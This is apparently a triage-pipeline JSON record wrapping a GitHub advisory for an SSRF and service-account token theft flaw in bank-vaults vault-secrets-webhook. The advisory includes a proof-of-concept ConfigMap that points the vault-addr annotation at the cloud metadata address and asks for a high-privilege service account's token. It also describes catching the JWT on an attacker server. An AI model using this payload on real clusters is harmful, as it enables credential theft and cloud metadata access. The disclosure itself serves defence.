@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/53905346?v=4\", \"events_url\": \"https://api.github.com/users/0xVijay/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/0xVijay/followers\", \"following_url\": \"https://api.github.com/users/0xVijay/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/0xVijay/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/0xVijay\", \"id\": 53905346, \"login\": \"0xVijay\", \"node_id\": \"MDQ6VXNlcjUzOTA1MzQ2\", \"organizations_url\": \"https://api.github.com/users/0xVijay/orgs\", \"received_events_url\": \"https://api.github.com/users/0xVijay/received_events\", \"repos_url\": \"https://api.github.com/users/0xVijay/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/0xVijay/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/0xVijay/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/0xVijay\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54725\", \"cvss\": {\"score\": 9.6, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.6, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"## Summary\\n\\nThe vault-secrets-webhook reads the `vault.security.banzaicloud.io/vault-addr` annotation from any ConfigMap or Secret being admitted and uses it as the Vault server address without any validation or allowlist. When a ConfigMap or Secret contains a value prefixed with `vault:`, the webhook's admission handler synchronously calls the Vault API at the attacker-supplied address from inside the webhook process during the admission review. The webhook additionally grants `serviceaccounts/token:create` cluster-wide, and the `vault-serviceaccount` annotation controls which ServiceAccount's JWT is fetched and sent to that address. An attacker who can create ConfigMaps or Secrets in a watched namespace can cause the webhook process to make arbitrary outbound HTTP connections and exfiltrate ServiceAccount JWTs.\\n\\n## Details\\n\\n`parseVaultConfig()` at `pkg/webhook/config.go:102-107` reads `VaultAddrAnnotation` unconditionally into `vaultConfig.Addr`:\\n\\n```go\\nif value, ok := annotations[common.VaultAddrAnnotation]; ok {\\n    vaultConfig.Addr = value\\n}\\n```\\n\\nNo URL scheme validation, no hostname allowlist, no RFC-1918 or link-local filter.\\n\\n`MutateConfigMap` and `MutateSecret` at `pkg/webhook/configmap.go` and `pkg/webhook/secret.go` call `mw.newVaultClient(ctx, vaultConfig)` when the object contains at least one `vault:...` value. Inside `newVaultClient`, at `pkg/webhook/webhook.go:285`:\\n\\n```go\\nclientConfig.Address = vaultConfig.Addr\\n```\\n\\n`vault.NewClientFromConfigWithContext` then opens an HTTP connection to the attacker-controlled address from the webhook server process, synchronously during the admission review. This is not deferred to a separate pod.\\n\\nThe `vault-skip-verify` annotation (`pkg/webhook/config.go:197`) sets `InsecureSkipVerify: true` on the TLS config, eliminating the need for a valid certificate on the attacker's server.\\n\\nWhen `VaultServiceaccountAnnotation` is also set, at `pkg/webhook/webhook.go`:\\n\\n```go\\nmw.k8sClient.CoreV1().ServiceAccounts(vaultConfig.ObjectNamespace).CreateToken(\\n    ctx, saName, &tokenRequest, metav1.CreateOptions{})\\n```\\n\\nThe webhook's ClusterRole (`deploy/charts/vault-secrets-webhook/templates/webhook-rbac.yaml`) grants `serviceaccounts/token:create` cluster-wide. The resulting JWT is then POSTed to `vaultConfig.Addr/v1/auth/<path>/login`. An attacker intercepts this JWT and replays it against the real Vault to access secrets bound to that ServiceAccount's Vault role.\\n\\n## Proof of Concept\\n\\nCreate a ConfigMap in any watched namespace:\\n\\n```yaml\\napiVersion: v1\\nkind: ConfigMap\\nmetadata:\\n  name: ssrf-poc\\n  namespace: tenant-ns\\n  annotations:\\n    vault.security.banzaicloud.io/vault-addr: \\\"http://169.254.169.254/latest/meta-data/\\\"\\n    vault.security.banzaicloud.io/vault-skip-verify: \\\"true\\\"\\n    vault.security.banzaicloud.io/vault-serviceaccount: \\\"high-priv-sa\\\"\\ndata:\\n  secret-key: \\\"vault:secret/data/test#value\\\"\\n```\\n\\nWhen this ConfigMap is created, the vault-secrets-webhook admission handler:\\n1. Parses the annotations and reads `vault-addr: http://169.254.169.254/latest/meta-data/`\\n2. Calls `CoreV1().ServiceAccounts(tenant-ns).CreateToken(ctx, \\\"high-priv-sa\\\", ...)` using cluster-wide `serviceaccounts/token:create`\\n3. Calls `vault.NewClientFromConfigWithContext` which POSTs the JWT to `http://169.254.169.254/latest/meta-data/v1/auth/kubernetes/login`\\n4. On AWS EKS with IMDSv1, the cloud metadata service receives the request from the webhook pod's IAM identity\\n\\nFor the SA token theft path: run an HTTP server at the attacker-controlled `vault-addr` to capture the `Authorization: Bearer <JWT>` header from the login POST.\\n\\n## Impact\\n\\nA user with `create` or `update` on ConfigMaps or Secrets in any namespace watched by the vault-secrets-webhook can:\\n1. Cause the webhook process (a cluster-wide privileged component) to make arbitrary outbound HTTP connections to any address including cloud IMDS\\n2. Exfiltrate ServiceAccount JWTs for any SA in their namespace, which can be replayed against the real Vault server to read secrets the SA's role is authorized to access\\n\\nThe attack happens at admission time in the webhook server process, not in a user pod, and requires no special privileges beyond ConfigMap or Secret create/update rights.\", \"ghsa_id\": \"GHSA-r2v3-8gwf-7ghm\", \"github_reviewed_at\": \"2026-07-31T17:45:02Z\", \"html_url\": \"https://github.com/advisories/GHSA-r2v3-8gwf-7ghm\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-r2v3-8gwf-7ghm\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54725\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-31T17:45:02Z\", \"references\": [\"https://github.com/bank-vaults/vault-secrets-webhook/security/advisories/GHSA-r2v3-8gwf-7ghm\", \"https://github.com/bank-vaults/vault-secrets-webhook/commit/76db45976fee0f54cafd94dffa425e6b542f65a0\", \"https://github.com/bank-vaults/vault-secrets-webhook/releases/tag/v1.23.1\", \"https://github.com/advisories/GHSA-r2v3-8gwf-7ghm\"], \"repository_advisory_url\": \"https://api.github.com/repos/bank-vaults/vault-secrets-webhook/security-advisories/GHSA-r2v3-8gwf-7ghm\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/bank-vaults/vault-secrets-webhook\", \"summary\": \"vault-addr annotation SSRF -- webhook makes outbound HTTP call to attacker URL during admission; vault-serviceaccount enables cluster-wide SA token theft via TokenRequest API\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-31T17:45:04Z\", \"url\": \"https://api.github.com/advisories/GHSA-r2v3-8gwf-7ghm\", \"vulnerabilities\": [{\"first_patched_version\": \"1.23.1\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/bank-vaults/vault-secrets-webhook\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.22.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-r2v3-8gwf-7ghm",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/bank-vaults/vault-secrets-webhook: <= 1.22.2"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-54725"
+    ],
+    "cvss_score": 9.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/bank-vaults/vault-secrets-webhook"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-31T19:38:04.527146Z",
+  "provenance": {
+    "content_sha256": "1c62bc57e3dcb92ff0616524094ab206d4f331a1b05c3f73cee3c1c7fd464eb1",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-31T17:45:02Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-r2v3-8gwf-7ghm",
+  "status": "active",
+  "title": "vault-addr annotation SSRF -- webhook makes outbound HTTP call to attacker URL during admission; vault-serviceaccount enables cluster-wide SA token theft via TokenRequest API",
+  "updated_at": "2026-07-31T17:45:04Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-r2v3-8gwf-7ghm"
+}
